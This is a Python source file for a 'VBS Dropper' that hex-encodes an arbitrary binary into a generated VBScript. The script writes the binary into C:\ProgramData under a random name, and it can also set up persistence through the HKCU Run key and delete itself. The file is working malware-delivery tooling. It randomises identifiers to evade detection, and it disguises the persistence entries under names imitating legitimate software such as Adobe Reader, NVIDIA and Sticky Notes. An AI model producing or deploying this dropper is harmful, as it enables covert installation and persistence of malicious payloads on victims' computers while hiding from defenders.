g_vbs_startup_script = '''
Set {variable_1_name} = CreateObject( "WScript.Shell" )
{variable_1_name}.RegWrite "{reg_path}", "{reg_filepath}", "{reg_type}"
Set {variable_1_name} = Nothing
'''
g_vbs_discard_script = '''
Function {variable_3_name}()
    Set {variable_2_name} = CreateObject("Scripting.FileSystemObject")
    {variable_1_name} = Wscript.ScriptFullName
    {variable_2_name}.DeleteFile({variable_1_name})
End Function
{variable_3_name}()
'''
g_vbs_decode_array_script = '''
Function {variable_3_name}({variable_2_name})
    For {variable_1_name} = 1 To Int(Len({variable_2_name})/3)+1
      {variable_4_name} = {variable_4_name} & Chr("&H" & Mid({variable_2_name}, 3*{variable_1_name}-2,2))
    Next
    {variable_3_name}={variable_4_name}
End Function
Dim {variable_5_name}, {variable_6_name}
Set {variable_5_name} = CreateObject("Scripting.FileSystemObject")
Set {variable_6_name} = {variable_5_name}.CreateTextFile("{destination}", True)
j = 0
Do While j < {array_size}
    {variable_6_name}.Write( {variable_3_name}({array_name}(j)) )
    j = j + 1
Loop
{variable_6_name}.Close
'''

reg_key_names = [
    "nvsvck",
    "Abode Reader",
    "ALaunch component",
    "NVIDIA Capture Proxy Serve",
    "Sticky Note"
]

import argparse
import binascii
import random
import string
import os

parser = argparse.ArgumentParser(description='VBS Dropper')
parser.add_argument('target')
parser.add_argument('--destination')
parser.add_argument('--startup', action='store_true')
parser.add_argument('--discard', action='store_true')
parser.add_argument('--chunk-size', type=int)
args = parser.parse_args()

class Config():
    def __init__(self):
        self._DEBUG = True
        self._VERBOSE = True

class RandomUtils():
    def getRandomString(self, length=15):
        return ''.join(
            random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(length)
        )

class Pack(Config, RandomUtils):

    def __init__(self, args):
        super(Pack, self).__init__()
        self.random_names_memory = []
        self.target = args.target
        self.args = args
        self.random_function = self.getRandomString
        # Hexlify target
        with open(args.target, "rb") as source:
            self.payload_hexlified = str(binascii.hexlify(source.read()), "utf8")
            self.payload_array = []
            s, e = 0, 2
            while e != len(self.payload_hexlified) + 2:
                self.payload_array.append(self.payload_hexlified[s:e])
                s, e = s+2, e+2
            source.close()

    def getUID(self):
        result = self.random_function()
        while result in self.random_names_memory:
            result = self.random_function()
        self.random_names_memory.append(result)
        return result

    def getPayloadArray(self, array_name, chunk_size):
        lines_array, _byte_line = [], ""
        line_counter, counter = 0, 0
        for _byte in self.payload_array:
            _byte_line += "{_byte} ".format(_byte=_byte)
            counter += 1
            if counter == chunk_size:
                lines_array.append(_byte_line.strip(" "))
                _byte_line = ""
                line_counter += 1
                counter = 0

        if _byte_line != "":
            lines_array.append(_byte_line.strip(" "))
            line_counter += 1

        for line_it in range(len(lines_array)):
            lines_array[line_it] = "{array_name}({it}) = \"{line}\"\n".format(
                array_name=array_name,
                it=line_it,
                line=lines_array[line_it]
            )
        lines_array.insert(0, "Dim {array_name}({array_length})\n".format(
                array_name=array_name,
                array_length=len(lines_array)
            )
        )
        return lines_array

    def getPayloadScript(self, array_name, chunk_size):
        payload_array = self.getPayloadArray(array_name, chunk_size)
        payload_array_size = len(payload_array) - 1 # -1 because array declaration
        ret = "".join(payload_array)
        return ret, payload_array_size

    def getDiscardScript(self):
        ret = g_vbs_discard_script
        ret = ret.format(
            variable_1_name=self.getUID(),
            variable_2_name=self.getUID(),
            variable_3_name=self.getUID()
        )
        return ret

    def getStartupScript(self, reg_keyname, reg_filepath, reg_root="HKCU"):
        ret = g_vbs_startup_script
        ret = ret.format(
            variable_1_name=self.getUID(),
            reg_path="{reg_root}\Software\Microsoft\Windows\CurrentVersion\Run\{reg_keyname}".format(
                reg_root=reg_root,
                reg_keyname=reg_keyname
            ),
            reg_filepath=reg_filepath,
            reg_type="REG_SZ"
        )
        return ret

    def getDecodeScript(self, array_name, array_size, destination):
        ret = g_vbs_decode_array_script
        ret = ret.format(
            variable_1_name=self.getUID(),
            variable_2_name=self.getUID(),
            variable_4_name=self.getUID(),
            variable_3_name=self.getUID(),
            variable_5_name=self.getUID(),
            variable_6_name=self.getUID(),
            variable_7_name=self.getUID(),
            array_size=array_size,
            destination=destination,
            array_name=array_name
        )
        return ret

if __name__ == "__main__":

    packer = Pack(args)

    extension = args.target.split(".")[-1] if len(args.target.split(".")) != 1 else ""
    array_name = packer.getUID()
    chunk_size = args.chunk_size if args.chunk_size else 32
    destination = args.destination if args.destination else "C:\\ProgramData\\{tmp}.{ext}".format(tmp=packer.getUID(), ext=extension)
    reg_keyname = reg_key_names[random.randint(0,len(reg_key_names)-1)]

    script_payload_array, payload_size = packer.getPayloadScript(array_name=array_name, chunk_size=chunk_size)
    script_decode = packer.getDecodeScript(
        array_name=array_name,
        destination=destination,
        array_size=payload_size
    )
    script_startup = packer.getStartupScript(reg_keyname, destination)
    script_discard = packer.getDiscardScript()

    print(script_payload_array)
    print(script_decode)
    if args.startup:
        print(script_startup)
    if args.discard:
        print(script_discard)
